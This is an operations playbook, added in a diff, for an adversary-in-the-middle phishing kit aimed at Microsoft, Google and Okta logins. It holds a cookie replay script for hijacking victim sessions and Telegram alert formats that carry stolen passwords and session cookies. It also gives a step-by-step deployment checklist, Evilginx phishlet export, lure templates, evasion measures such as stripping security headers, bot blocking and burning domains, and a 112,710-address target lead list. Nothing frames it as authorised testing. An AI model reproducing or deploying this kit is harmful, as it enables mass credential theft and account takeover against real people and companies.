+<p>&mdash; <strong>1. Syntax check</strong> &mdash; well-formed email address<br>
+&mdash; <strong>2. Disposable domain</strong> &mdash; auto-updated blocklist from AfterShip library<br>
+&mdash; <strong>3. MX record lookup</strong> &mdash; domain has mail server (cached per domain)<br>
+&mdash; <strong>4. Catch-all detection</strong> &mdash; SMTP RCPT TO probes with random local parts<br>
+&mdash; <strong>5. SMTP deliverability</strong> &mdash; actual RCPT TO to the mail server (with SOCKS5 proxy support)</p>
+
+<p><strong>Imported into SuperMailer:</strong></p>
+
+<p>&mdash; CSV column <code>email</code> &rarr; SuperMailer field <code>Email</code><br>
+&mdash; CSV column <code>first</code> &rarr; SuperMailer field <code>FirstName</code><br>
+&mdash; CSV column <code>last</code> &rarr; SuperMailer field <code>LastName</code><br>
+&mdash; Use <code>{FirstName}</code> merge field in email body for personalization<br>
+&mdash; Enable built-in dedup by email address</p>
+
+<h2>7. Campaign Manager</h2>
+
+<h3>Architecture</h3>
+
+<pre><code>campaign-manager/
+├── main.go                  # CLI dispatch (unified binary entry point)
+├── core/                    # Shared library (both UIs call same functions)
+│   ├── campaign.go          # Campaign struct + CRUD (JSON files per campaign)
+│   ├── link.go              # GenerateLink() — AES-256-GCM encryption
+│   ├── verify.go            # VerifyLeads() — email validation pipeline
+│   └── preview.go           # PreviewLure() — placeholder substitution
+├── web/                     # Web UI (browser-based)
+│   ├── main.go              # HTTP server: --port 9093 --token --lures --phishlets --store
+│   ├── server.go            # Routes: GET/POST /api/campaigns, /api/events
+│   └── templates/           # Embedded Go HTML templates
+└── tui/                     # TUI (terminal-based, SSH-friendly)
+    └── app.go               # Bubble Tea + tview, keyboard-driven</code></pre>
+
+<h3>4-Step Campaign Workflow</h3>
+
+<pre><code>  Step 1: CREATE    Name your campaign, pick a lure + phishlet
+  Step 2: LINK      Feed AES-256 key + redirect URL → encrypted phishing link
+  Step 3: VERIFY    Upload CSV of target emails → validate deliverability
+  Step 4: DEPLOY    Mark campaign ready → send via SuperMailer</code></pre>
+
+<h3>Web UI Quick Start</h3>
+
+<pre><code>cd campaign-manager/web
+go run . \
+  --port 9093 \
+  --token "super-secret-token" \
+  --lures ../../lures/attachments \
+  --phishlets ../../proxy-server/phishlets \
+  --store ../data/campaigns.json</code></pre>
+
+<p><strong>Authentication</strong> (two orthogonal mechanisms):</p>
+
+<p>&mdash; <strong>Token auth:</strong> <code>?token=...</code> on first visit sets 24-hour HttpOnly cookie <code>_auth</code>. Subsequent visits use cookie. API: <code>Authorization: Bearer &lt;token&gt;</code> header.<br>
+&mdash; <strong>IP allowlist:</strong> <code>ALLOWED_IPS="10.0.0.0/8,172.16.0.0/12"</code> env var. Non-matching IPs get empty 404 (<code>&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code>).</p>
+
+<h3>TUI Quick Start</h3>
+
+<pre><code>cd campaign-manager/tui
+go run .</code></pre>
+
+<p><strong>Keyboard controls:</strong> <kbd>j</kbd>/<kbd>k</kbd> navigate campaigns, <kbd>Tab</kbd> switch panels, <kbd>L</kbd> generate link, <kbd>V</kbd> verify leads, <kbd>P</kbd> preview, <kbd>D</kbd> deploy, <kbd>Q</kbd> quit.</p>
+
+<h3>Link Generation API (curl)</h3>
+
+<pre><code>curl -X POST http://localhost:9093/api/campaigns/&lt;CAMPAIGN_ID&gt;/link \
+  -H "Authorization: Bearer super-secret-token" \
+  -d "redirect=https://login.microsoftonline.com/...&amp;key=BASE64_32_BYTE_KEY"
+# Returns: {"link":"https://auth.your-domain.com/#H4sIAAA..."}</code></pre>
+
+<h3>Live Events API</h3>
+
+<pre><code>curl http://localhost:9093/api/events -H "Authorization: Bearer super-secret-token"
+# Returns: {"total":42,"page_loads":38,"credentials":12,"mfa_complete":5,"rate":"13.2%",...}</code></pre>
+
+<h2>8. Analytics Dashboard</h2>
+
+<h3>Endpoint</h3>
+
+<pre><code>http://&lt;EC2-IP&gt;:9092/?token=&lt;YOUR_TOKEN&gt;</code></pre>
+
+<h3>Data Model (<code>analytics-server/analytics.go</code>)</h3>
+
+<pre><code>type CaptureEvent struct {
+    Timestamp  string `json:"timestamp"`
+    CampaignID string `json:"campaign_id"`
+    Brand      string `json:"brand"`
+    Username   string `json:"username"`
+    IP         string `json:"ip"`
+    UserAgent  string `json:"user_agent"`
+    Status     string `json:"status"`     // "success" | "info"
+    EventType  string `json:"event_type"` // "page_load" | "credential_submit" | "mfa_complete"
+    Source     string `json:"source"`     // "proxy"
+}</code></pre>
+
+<h3>Dashboard Sections</h3>
+
+<table>
+  <thead><tr><th>Section</th><th>Description</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Summary cards</strong></td><td>Total events, success rate, unique IPs, active campaigns</td></tr>
+    <tr><td><strong>Campaign breakdown</strong></td><td>Per-campaign table: total, successes, failures, rate, last seen</td></tr>
+    <tr><td><strong>Funnel table</strong></td><td>Per-campaign: page_loads &rarr; cred_submits &rarr; mfa_completes &rarr; success_rate</td></tr>
+    <tr><td><strong>Victim timeline</strong></td><td>Per-victim journey: landed &rarr; partial (creds) &rarr; complete (MFA)</td></tr>
+    <tr><td><strong>Time bucketing</strong></td><td>60-minute windows with bar chart scaling, stacked by event type</td></tr>
+    <tr><td><strong>Top IPs</strong></td><td>Top 20 IPs by event count</td></tr>
+    <tr><td><strong>Recent events</strong></td><td>Last 50 events, reverse-chronological</td></tr>
+  </tbody>
+</table>
+
+<h3>Performance</h3>
+
+<p>&mdash; <strong>Mtime-based caching</strong> &mdash; re-reads JSONL only when file modification time changes (not on every request)<br>
+&mdash; <strong>Auto-purge</strong> &mdash; set <code>MAX_AGE_HOURS=72</code> to filter out events older than 72 hours<br>
+&mdash; <strong>Large file handling</strong> &mdash; 1 MB scanner buffer, malformed JSONL lines logged and skipped<br>
+&mdash; <strong>Server-rendered HTML</strong> &mdash; no JavaScript required in the browser, works over SSH tunnels</p>
+
+<h3>Cache Architecture</h3>
+
+<pre><code>type Cache struct {
+    mu    sync.RWMutex
+    path  string
+    mtime time.Time
+    data  *DashboardData
+    err   error
+}
+// On Get(): stat file, if mtime changed → re-parse + re-aggregate
+// Double-checked locking: RLock → check stale → RUnlock → Lock → recheck stale</code></pre>
+
+<h3>Starting the Dashboard</h3>
+
+<pre><code>cd analytics-server
+go build -o analytics-srv .
+./analytics-srv --data ../data/captures.jsonl --port 9092 --token "strong-token"
+
+# Or install as systemd service (see Section 11)</code></pre>
+
+<h2>9. Telegram Notifications</h2>
+
+<h3>Bot Setup</h3>
+
+<pre><code># 1. Message @BotFather on Telegram → /newbot → get token
+# 2. Message your new bot (say "hi")
+# 3. Message @getidsbot → get your chat ID
+# 4. Set environment variables:
+export TELEGRAM_BOT_TOKEN="8576202311:AA..."
+export TELEGRAM_CHAT_ID="5361206216"</code></pre>
+
+<h3>Single Notification Per Victim</h3>
+
+<p>The proxy sends exactly <strong>one</strong> Telegram message per victim &mdash; on MFA completion only. Credential-only captures (victim submits creds but abandons before MFA) are logged to JSONL for analytics but do not trigger Telegram. This avoids notification spam (3 alerts per victim in earlier versions).</p>
+
+<h3>Notification Format</h3>
+
+<p><strong>On MFA complete:</strong></p>
+
+<pre><code>🔴 FULL CAPTURE | Microsoft Personal | user@outlook.com
+👤 Username: user@outlook.com
+🔑 Password: Winter2026!
+🌐 IP: 203.0.113.5
+💻 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
+🕐 Time: 2026-06-19 15:04:05 UTC
+🎯 Campaign: q4-phish-001
+📎 Session: COOKIES CAPTURED</code></pre>
+
+<p><strong>On creds-only (no MFA &mdash; currently JSONL only, no Telegram):</strong></p>
+
+<pre><code>🔑 CREDS CAPTURED | Microsoft 365 | user@company.com
+⚠️ Status: Waiting for MFA — no session cookies yet</code></pre>
+
+<h3>Session Attachment (.txt)</h3>
+
+<pre><code>=== AiTM Session Capture ===
+Target: https://login.microsoftonline.com/... (Microsoft Personal)
+Username: user@outlook.com
+IP: 203.0.113.5
+Time: 2026-06-19 15:04:05 UTC
+Campaign: q4-phish-001
+
+--- All Captured Cookies ---
+ESTSAUTH=1.AagAqzBR...; domain=.login.microsoftonline.com; path=/; secure; HttpOnly
+ESTSAUTHPERSISTENT=1.AagAqzBR...; domain=.login.microsoftonline.com; path=/; secure; HttpOnly
+SignInStateCookie=CAgABFgI...; domain=.login.microsoftonline.com; path=/; secure; HttpOnly
+
+--- Victim Cookies ---
+_s=https%3A%2F%2Flogin.microsoftonline.com%2F...
+_c=q4-phish-001
+
+=== COOKIE REPLAY SCRIPT ===
+// Paste this in browser console on the target domain.
+// Target: https://login.microsoftonline.com/...
+(function(){
+var c=[
+{n:'ESTSAUTH',v:'1.AagAqzBR...',d:'.login.microsoftonline.com',p:'/',s:true,e:'9999999999'},
+...
+];
+var s="";for(var i=0;i&lt;c.length;i++){s=c[i].n+"="+c[i].v+";expires="+c[i].e+";path="+c[i].p;if(c[i].d)s+=";domain="+c[i].d;if(c[i].s)s+=";Secure";document.cookie=s};
+location.reload();
+})();</code></pre>
+
+<p><strong>Filename convention:</strong> <code>user_at_outlook_com-session.txt</code> (email-safe: <code>@</code> &rarr; <code>_at_</code>, <code>.</code> &rarr; <code>_</code>)</p>
+
+<h3>Cookie Replay Instructions</h3>
+
+<pre><code>1. Open browser in incognito/private mode
+2. Navigate to https://login.microsoftonline.com/
+3. Open Developer Console (F12) → Console tab
+4. Paste the entire === COOKIE REPLAY SCRIPT === block
+5. Press Enter → page reloads → you are authenticated as the victim</code></pre>
+
+<h2>10. Evilginx Interoperability</h2>
+
+<h3>JSON-to-Evilginx Exporter (<code>scripts/json2evilginx/</code>)</h3>
+
+<p>Template-based YAML exporter that converts our internal phishlet JSON format to Evilginx 3.9.9 phishlet YAML.</p>
+
+<pre><code># Export all 4 phishlets
+go run ./scripts/json2evilginx --all
+# Outputs to exports/evilginx/
+
+# Export single phishlet
+go run ./scripts/json2evilginx --phishlet microsoft-personal</code></pre>
+
+<h3>Reference Templates (<code>scripts/json2evilginx/templates/</code>)</h3>
+
+<table>
+  <thead><tr><th>Template</th><th>Lines</th><th>Purpose</th></tr></thead>
+  <tbody>
+    <tr><td>Microsoft (451)</td><td>451</td><td>Full Evilginx phishlet with proxy_hosts, sub_filters, auth_tokens, credentials, js_inject, force_post, intercept</td></tr>
+    <tr><td>Google (206)</td><td>206</td><td>Google Workspace Evilginx phishlet</td></tr>
+    <tr><td>Okta (362)</td><td>362</td><td>Okta SSO Evilginx phishlet</td></tr>
+  </tbody>
+</table>
+
+<h3>Evilginx YAML Structure (sections generated)</h3>
+
+<pre><code># Sections produced by the template engine:
+proxy_hosts:       # upstream hosts with our phishlet hostname mapping
+  - phish_sub: auth.your-domain.com
+    orig_sub: login.live.com
+    domain: live.com
+    session: true
+
+sub_filters:       # body/location rewriting rules
+  - trimsuffix: '.your-domain.com'
+    orig: 'login.live.com'
+
+auth_tokens:       # session cookie definitions (HTTP GET pattern matching)
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+
+credentials:       # username/password extraction regex
+  username:
+    key: 'loginfmt'
+
+js_inject:         # JavaScript injection triggers
+  - trigger_domains: ["login.live.com"]
+
+force_post:        # POST body manipulation rules
+
+intercept:         # Intercept rules for specific paths</code></pre>
+
+<h3>Exported Files</h3>
+
+<pre><code>exports/evilginx/
+├── google.yaml
+├── microsoft.yaml
+├── microsoft-personal.yaml
+└── okta.yaml</code></pre>
+
+<h2>11. Deployment Checklist</h2>
+
+<h3>Step-by-step: Domain Registration to First Campaign</h3>
+
+<pre><code>□ 1. DOMAIN REGISTRATION &amp; AGING
+   □ Register domain (Cloudflare Registrar recommended) — 4-5 chars, .cc or .xyz
+   □ If using aged domain: acquire via ExpiredDomains.net / GoDaddy Closeout (see FM-004 §1)
+   □ Transfer to Cloudflare for unified DNS + Worker management
+   □ Age 2-3 weeks if new, or verify 3+ year history if aged
+
+□ 2. EC2 INSTANCE
+   □ Launch Ubuntu 22.04 t2.micro (free tier)
+   □ Key pair: download .pem, chmod 400
+   □ Security group:
+     • Port 22 — Your IP/32
+     • Port 9091 — Cloudflare IP ranges: https://www.cloudflare.com/ips-v4
+     • Port 9092 — Your IP/32
+     • Port 9093 — Your IP/32 or localhost only
+
+□ 3. CLOUDFLARE DNS
+   □ Add A records (orange cloud ON for all):
+     auth.&lt;domain&gt;       A    &lt;EC2_IP&gt;
+     accounts.&lt;domain&gt;   A    &lt;EC2_IP&gt;
+     idp.&lt;domain&gt;        A    &lt;EC2_IP&gt;
+   □ SSL/TLS → Flexible
+
+□ 4. CLOUDFLARE WORKER
+   □ cd cdn-config
+   □ Edit wrangler.toml: update zone_name, patterns for your domain
+   □ npx wrangler login
+   □ npx wrangler deploy
+   □ npx wrangler secret put ORIGIN_URL → http://&lt;EC2_IP&gt;:9091
+
+□ 5. SERVER DEPLOY
+   □ ssh -i your-key.pem ubuntu@&lt;EC2-IP&gt;
+   □ sudo apt update &amp;&amp; sudo apt install -y golang-go git
+   □ git clone &lt;repo-url&gt; &amp;&amp; cd azure-phish-kit
+
+□ 6. GENERATE AES KEY
+   □ cd payload-generator &amp;&amp; go run keygen.go
+   □ Copy the 44-character base64 key
+
+□ 7. CONFIGURE BOOTLOADER
+   □ Edit proxy-server/bootloader.html
+   □ Set: const _k = '&lt;YOUR-BASE64-KEY&gt;';
+   □ DO NOT commit the edited bootloader.html
+
+□ 8. UPDATE PHISHLET HOSTNAMES
+   □ Edit each proxy-server/phishlets/*.json
+   □ Change "hostname" field to your domain's subdomains:
+     - microsoft-personal.json: "auth.&lt;domain&gt;"
+     - microsoft.json: "auth.&lt;domain&gt;"
+     - google.json: "accounts.&lt;domain&gt;"
+     - okta.json: "idp.&lt;domain&gt;"
+
+□ 9. BUILD PROXY SERVER
+   □ cd proxy-server
+   □ GOOS=linux GOARCH=amd64 go build -o proxy-srv .
+
+□ 10. START PROXY (systemd)
+   □ sudo cp proxy-srv /home/ubuntu/azure-phish-kit/proxy-server/
+   □ Install systemd unit (see below for service file)
+   □ sudo systemctl daemon-reload &amp;&amp; sudo systemctl enable phish-proxy
+   □ sudo systemctl start phish-proxy &amp;&amp; sudo systemctl status phish-proxy
+
+□ 11. START ANALYTICS (optional)
+   □ cd analytics-server &amp;&amp; go build -o analytics-srv .
+   □ Install systemd unit (see Section 4 of FM-001)
+   □ sudo systemctl enable phish-analytics &amp;&amp; sudo systemctl start phish-analytics
+
+□ 12. GENERATE CLOUDFLARE IP LOCK SCRIPT
+   □ Write script to update EC2 security group 9091 to Cloudflare IPs only
+   □ Or manually set 9091 source to Cloudflare's IP ranges
+   □ Verify: curl from non-Cloudflare IP should timeout
+
+□ 13. VERIFY DEPLOYMENT
+   □ curl -I https://&lt;domain&gt;/                      → 200, text/html (bootloader)
+   □ curl -H "User-Agent: Googlebot/2.1" https://&lt;domain&gt;/ → 404
+   □ curl -H "Cookie: _s=&lt;encoded-upstream&gt;" https://&lt;domain&gt;/ → Microsoft login page
+   □ Test full flow: click link → bootloader → login page → enter creds → MFA → Telegram
+
+□ 14. PREPARE CAMPAIGN
+   □ Generate link: cd payload-generator &amp;&amp; go run . --key &lt;KEY&gt; --redirect &lt;OAUTH_URL&gt; --campaign &lt;ID&gt;
+   □ Save link to CURRENT_LINK.txt
+   □ Build lure email: cd scripts &amp;&amp; ./build-campaign-email.sh &lt;lure&gt; "&lt;LINK&gt;" "&lt;NAME&gt;" email.html
+   □ Import leads into SuperMailer: Recipients → Import CSV → data/leads/&lt;target&gt;.csv
+   □ Configure SMTP: Port 587, STARTTLS, throttle 50/hr
+   □ Send test email → verify at mail-tester.com (score 9+/10)
+   □ Click test link → verify bootloader → login page → Telegram capture
+
+□ 15. SEND CAMPAIGN
+   □ Warm-up: 10/hr (Day 1-2) → 25-50/hr (Day 3) → 50-100/hr (Day 4+)
+   □ Monitor analytics dashboard: http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;
+   □ Monitor Telegram for captures
+   □ Monitor bounce rate &lt;5% — pause immediately if exceeded</code></pre>
+
+<h3>systemd Service Files</h3>
+
+<p><strong>Proxy Server</strong> (<code>/etc/systemd/system/phish-proxy.service</code>):</p>
+
+<pre><code>[Unit]
+Description=AiTM Phishing Proxy
+After=network.target
+
+[Service]
+Type=simple
+User=ubuntu
+WorkingDirectory=/home/ubuntu/azure-phish-kit/proxy-server
+Environment="TELEGRAM_BOT_TOKEN=&lt;TOKEN&gt;"
+Environment="TELEGRAM_CHAT_ID=&lt;CHAT_ID&gt;"
+Environment="PHISHING_HOST=&lt;YOUR_DOMAIN&gt;"
+Environment="PORT=9091"
+ExecStart=/home/ubuntu/azure-phish-kit/proxy-server/proxy-srv
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+
+<p><strong>Analytics Server</strong> (<code>/etc/systemd/system/phish-analytics.service</code>):</p>
+
+<pre><code>[Unit]
+Description=Analytics Dashboard
+After=network.target
+
+[Service]
+Type=simple
+User=ubuntu
+WorkingDirectory=/home/ubuntu/azure-phish-kit/analytics-server
+ExecStart=/home/ubuntu/azure-phish-kit/analytics-server/analytics-srv \
+  --data /home/ubuntu/azure-phish-kit/data/captures.jsonl \
+  --port 9092 \
+  --token "&lt;STRONG_RANDOM_TOKEN&gt;"
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target</code></pre>
+
+<h2>12. OPSEC</h2>
+
+<h3>Hardening Already Applied</h3>
+
+<table>
+  <thead><tr><th>Layer</th><th>Measure</th><th>Implementation</th></tr></thead>
+  <tbody>
+    <tr><td><strong>URL payload</strong></td><td>Fragment-based delivery</td><td>Payload in <code>#</code> (never sent in HTTP request)</td></tr>
+    <tr><td><strong>Encryption</strong></td><td>AES-256-GCM + random 3-byte prefix</td><td><code>link.go</code> encryptAESGCM() + random prefix before base64url</td></tr>
+    <tr><td><strong>JS symbols</strong></td><td>All obfuscated</td><td><code>_k</code>, <code>_d</code>, <code>_b</code> instead of <code>AES_KEY_B64</code>, <code>decryptAESGCM</code>, <code>lure</code></td></tr>
+    <tr><td><strong>Endpoints</strong></td><td>Generic names</td><td><code>/auth</code>, <code>/r</code>, <code>/healthz</code> &mdash; no <code>/capture</code>, <code>/exfil</code></td></tr>
+    <tr><td><strong>Cookies</strong></td><td>Non-descriptive names</td><td><code>_s</code> (upstream), <code>_c</code> (campaign) &mdash; not <code>__upstream</code>, <code>__campaign</code></td></tr>
+    <tr><td><strong>Form fields</strong></td><td>Match real provider names</td><td><code>loginfmt</code>, <code>passwd</code>, <code>identifier</code>, <code>Passwd</code></td></tr>
+    <tr><td><strong>Security headers</strong></td><td>CSP/XFO/HSTS stripped</td><td><code>rewriteResponse()</code> via phishlet Rewrite config</td></tr>
+    <tr><td><strong>Server header</strong></td><td>Overridden via Cloudflare</td><td>Worker sets Server &rarr; <code>cloudflare</code></td></tr>
+    <tr><td><strong>Bot blocking</strong></td><td>14 crawler UA patterns</td><td>Googlebot, Bingbot, Baiduspider, DuckDuckBot, YandexBot, Slurp, Facebot, Twitterbot, PetalBot, Applebot, AhrefsBot, SemrushBot, DotBot, Screaming Frog, Bytespider</td></tr>
+    <tr><td><strong>Rate limiting</strong></td><td>Token-bucket 10 req/min per IP</td><td><code>ratelimit.go</code> &rarr; 429 on overflow</td></tr>
+    <tr><td><strong>Error pages</strong></td><td>Custom 404</td><td><code>&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code> &mdash; no Go stack traces</td></tr>
+    <tr><td><strong>Logs</strong></td><td>No plaintext credentials</td><td>stdout only logs event metadata, not POST bodies</td></tr>
+    <tr><td><strong>JSONL</strong></td><td>Permissions 0600</td><td><code>os.OpenFile(..., 0600)</code></td></tr>
+    <tr><td><strong>CDN assets</strong></td><td>Served from Microsoft CDN directly</td><td><code>/ests/*</code>, <code>/shared/*</code> &rarr; <code>aadcdn.msftauth.net</code></td></tr>
+    <tr><td><strong>Comments</strong></td><td>Stripped from production HTML/JS</td><td>Dev comments removed in build</td></tr>
+    <tr><td><strong>Origin IP</strong></td><td>Hidden behind Cloudflare Worker</td><td>All traffic through CF &rarr; EC2 via HTTP</td></tr>
+    <tr><td><strong>Request size</strong></td><td>Max 64 KB</td><td><code>http.MaxBytesHandler(mux, 64&lt;&lt;10)</code></td></tr>
+    <tr><td><strong>Security headers</strong></td><td><code>X-Content-Type-Options: nosniff</code>, <code>Referrer-Policy: no-referrer</code></td><td><code>securityHeaders()</code> middleware</td></tr>
+  </tbody>
+</table>
+
+<h3>What You Must Do</h3>
+
+<pre><code>□ Lock SSH port to your IP only (currently 0.0.0.0/0)
+□ Lock port 9091 to Cloudflare IP ranges: https://www.cloudflare.com/ips-v4
+□ Lock port 9092 to your IP only
+□ Lock port 9093 to 127.0.0.1 or your IP only
+□ Change AES key from any default — run keygen.go
+□ Burn domain after each campaign or periodically
+□ Rotate Cloudflare Workers between campaigns
+□ Never commit .env or bootloader.html with real key
+□ Separate sender infrastructure from phishing infrastructure
+  └── Do NOT use the phishing domain as the email sender
+  └── Register a separate sender domain with SPF/DKIM/DMARC
+□ Verify header hygiene before every campaign
+  └── Check raw email source for phishing domain or origin IP leaks
+□ Burn SMTP credentials and sender domains between campaigns
+□ Use SSH tunneling for sensitive ports: ssh -L 9092:localhost:9092 user@ec2
+□ Never discuss OpSec in a browser-based session — local terminal only</code></pre>
+
+<h3>Auto-Purge</h3>
+
+<p>Analytics server supports time-based auto-purge of old events:</p>
+
+<pre><code>MAX_AGE_HOURS=72 ./analytics-srv --data ../data/captures.jsonl --port 9092 --token "token"
+# Events older than 72 hours are filtered out from all dashboard views</code></pre>
+
+<h3>Port Separation (CRITICAL)</h3>
+
+<table>
+  <thead><tr><th>Port</th><th>Service</th><th>Public</th><th>Auth</th></tr></thead>
+  <tbody>
+    <tr><td>9091</td><td>Proxy</td><td>Cloudflare IPs only</td><td>None</td></tr>
+    <tr><td>9092</td><td>Analytics</td><td>Your IP only</td><td>Token</td></tr>
+    <tr><td>9093</td><td>Campaign Mgr</td><td>127.0.0.1</td><td>Token + IP allowlist</td></tr>
+  </tbody>
+</table>
+
+<div class="warn"><strong>Critical:</strong> Never expose 9092 or 9093 to the public internet. Use SSH tunnels:</div>
+
+<pre><code>ssh -L 9092:localhost:9092 -L 9093:localhost:9093 user@ec2-instance
+# Then access: http://localhost:9092/?token=... and http://localhost:9093/</code></pre>
+
+<h2>13. Component Reference &mdash; Complete File Map</h2>
+
+<pre><code>azure-phish-kit/
+│
+├── proxy-server/                           # AiTM reverse proxy (THE CORE)
+│   ├── main.go                             # Server entry point, handleRequest(), serveProxy(),
+│   │                                       #   notifyCapture(), writeEvent(), rewriteBody(),
+│   │                                       #   rewriteResponse(), telegram senders, bot blocking
+│   ├── bootloader.html                     # Embedded JS: AES-256-GCM decrypt, set _s cookie, reload
+│   ├── phishlet.go                         # Phishlet struct, loadPhishlets(), matchPhishlet(),
+│   │                                       #   hostMatchesHost(), extractUsername/Password,
+│   │                                       #   isSessionCookie(), allUpstreamHosts()
+│   ├── ratelimit.go                        # Token-bucket rate limiter (10 req/min per IP)
+│   ├── go.mod / go.sum
+│   └── phishlets/
+│       ├── microsoft-personal.json         # Multi-host: login.live.com + login.microsoftonline.com
+│       ├── microsoft.json                  # Organization-only: login.microsoftonline.com
+│       ├── google.json                     # Google Workspace: accounts.google.com
+│       └── okta.json                       # Okta SSO: *.okta.com (wildcard suffix match)
+│
+├── payload-generator/                      # AES-256-GCM payload encryptor
+│   ├── main.go                             # CLI: --key, --email, --redirect, --campaign, --brand, --template
+│   └── keygen.go                           # Generate 32-byte AES-256 key, print base64
+│
+├── analytics-server/                       # Campaign dashboard (Go HTTP)
+│   ├── main.go                             # HTTP server, routes, template rendering
+│   ├── analytics.go                        # parseJSONL(), aggregate(), buildTimeline(), buildBuckets(),
+│   │                                       #   Cache (mtime-based), CampaignFunnel, VictimTimeline, TimeBucket
+│   ├── dashboard.html                      # Embedded HTML template (server-rendered, no JS required)
+│   ├── go.mod / go.sum
+│   └── web/                                # Static assets (CSS, minimal)
+│
+├── campaign-manager/                       # Campaign orchestration (TUI + Web UI + shared core)
+│   ├── core/                               # Shared library
+│   │   ├── campaign.go                     # Campaign struct, ListCampaigns(), SaveCampaign(), LoadCampaign()
+│   │   ├── link.go                         # GenerateLink(): AES-256-GCM encrypt, LureConfig, 3-byte prefix
+│   │   ├── verify.go                       # VerifyLeads(): email validation, AfterShip library, MX cache, SMTP
+│   │   └── preview.go                      # PreviewLure(): {LINK}/##victimemail## substitution
+│   ├── web/                                # Web UI (browser-based, port 9093)
+│   │   ├── main.go                         # Server entry point, flags, auth middleware
+│   │   ├── server.go                       # HTTP routes, campaign handlers, API endpoints
+│   │   └── templates/                      # Embedded Go HTML templates
+│   ├── tui/                                # Terminal UI (Bubble Tea, SSH-friendly)
+│   │   └── app.go                          # TUI application, keyboard controls, workflow panels
+│   └── data/                               # Campaign state (JSON files, gitignored)
+│       └── campaigns.json                  # Web UI campaign store (single file)
+│
+├── email-verifier/                         # Email verification CLI
+│   ├── main.go                             # CLI entry point, flag parsing
+│   ├── verifier.go                         # Verification pipeline (syntax, disposable, MX, catch-all, SMTP)
+│   ├── go.mod / go.sum
+│   └── (AfterShip/email-verifier library)  # Automatic MX lookup + SMTP verification
+│
+├── cdn-config/                             # Cloudflare Worker
+│   ├── worker.js                           # Reverse proxy, bot UA blocking, header overrides, ORIGIN_URL routing
+│   └── wrangler.toml                       # Worker deployment config, zone routes
+│
+├── campaign-emails/                        # Email lure templates (production-ready)
+│   ├── email/                              # Inline HTML lures (paste into SuperMailer HTML Source)
+│   │   ├── shared-document.html
+│   │   ├── invoice-payment.html
+│   │   ├── meeting-invite.html
+│   │   ├── security-alert.html
+│   │   ├── voicemail-notification.html
+│   │   ├── hr-document.html
+│   │   ├── it-support.html
+│   │   ├── contract-signature.html
+│   │   ├── expense-report.html
+│   │   └── package-delivery.html
+│   └── attachments/                        # HTML attachment lures (attach to email in SuperMailer)
+│       ├── docusign-wire.html
+│       ├── adobe-contract.html
+│       ├── dropbox-share.html
+│       ├── sharepoint-doc.html
+│       ├── onedrive-file.html
+│       ├── teams-recording.html
+│       ├── excel-shared.html
+│       ├── gdocs-shared.html
+│       ├── zoom-recording.html
+│       └── stripe-payment.html
+│
+├── campaign-emails-obfuscated/             # Obfuscated copies (no plaintext placeholders, production-safe)
+│   ├── email/                              # Obfuscated inline lures
+│   └── attachments/                        # Obfuscated attachment lures
+│
+├── scripts/                                # Build, deployment, and conversion scripts
+│   ├── build-campaign-email.sh             # Replace {LINK} + {RECIPIENT_NAME} in lure HTML
+│   ├── generate-url.sh                     # URL assembly helper
+│   ├── obfuscate-lure.sh                   # Obfuscate a single lure HTML file
+│   ├── obfuscate_all.js                    # Batch JS obfuscation (all lures)
+│   ├── obfuscate_all.py                    # Batch Python obfuscation (all lures)
+│   ├── recreate_batch4.sh                  # Regenerate batch 4 lures
+│   ├── split_batch.py                      # Split large lead CSV into per-company files
+│   └── json2evilginx/                      # Evilginx 3.9.9 YAML converter
+│       ├── main.go                         # JSON → Evilginx YAML template engine
+│       ├── go.mod
+│       └── templates/                      # Reference Evilginx YAML templates
+│           ├── microsoft.yaml.tmpl
+│           ├── google.yaml.tmpl
+│           └── okta.yaml.tmpl
+│
+├── exports/evilginx/                       # Generated Evilginx phishlet exports
+│   ├── microsoft.yaml
+│   ├── microsoft-personal.yaml
+│   ├── google.yaml
+│   └── okta.yaml
+│
+├── data/                                   # Lead database + capture log (gitignored)
+│   ├── captures.jsonl                      # Live event log (JSONL, 0600 permissions)
+│   ├── master_leads.csv                    # Master lead DB (112,710 emails)
+│   ├── master_leads_verified.csv           # DNS-verified master DB with status columns
+│   ├── fidelity_leads.csv                  # Fidelity-specific lead set
+│   ├── fidelity_verified.csv               # Verified Fidelity leads
+│   ├── campaigns/                          # Campaign state JSON files (from campaign-manager/core)
+│   │   └── &lt;id&gt;.json
+│   └── leads/                              # Per-company CSV files (158 files, SuperMailer-ready)
+│       ├── addus_com.csv
+│       ├── blackrock_com.csv
+│       └── ... (158 files, 30+ industries, 6 continents)
+│
+├── docs/                                   # Documentation
+│   ├── domain-architecture.md              # Multi-host domain setup (MD + PDF)
+│   ├── domain-architecture.pdf
+│   ├── playbook/                           # Operations playbooks
+│   │   ├── oba7-unified-playbook.md        # FM-000: THIS FILE — master systems playbook
+│   │   ├── glnt-phish-kit-playbook.md      # FM-001: Proxy/phishlet/Telegram operations (MD + HTML + PDF)
+│   │   ├── campaign-manager.md             # FM-003: Campaign Manager Web UI + TUI (MD + HTML + PDF)
+│   │   ├── aged-domains-guide.md           # FM-004: Domain acquisition and aging guide (MD + HTML + PDF)
+│   │   ├── glnt-capabilities.pdf           # Capabilities overview (PDF)
+│   │   └── *.html, *.pdf                   # Rendered outputs
+│   ├── architecture.md
+│   ├── proxy-architecture.md
+│   └── threat-intel-report.md
+│
+├── CURRENT_LINK.txt                        # Active phishing URL (single source of truth, gitignored)
+├── README.md                               # Project overview
+├── tasks/
+│   └── todo.md                             # Completed/remaining tasks, implementation plan
+└── .gitignore                              # Excludes: data/*.jsonl, data/*.csv, CURRENT_LINK.txt</code></pre>
+
+<h3>Binaries (build once, deploy to EC2)</h3>
+
+<table>
+  <thead><tr><th>Binary</th><th>Source Directory</th><th>Architecture</th><th>Deploy Command</th></tr></thead>
+  <tbody>
+    <tr><td><code>proxy-srv</code></td><td><code>proxy-server/</code></td><td><code>GOOS=linux GOARCH=amd64 go build -o proxy-srv .</code></td><td><code>scp proxy-srv ubuntu@&lt;EC2&gt;:...</code></td></tr>
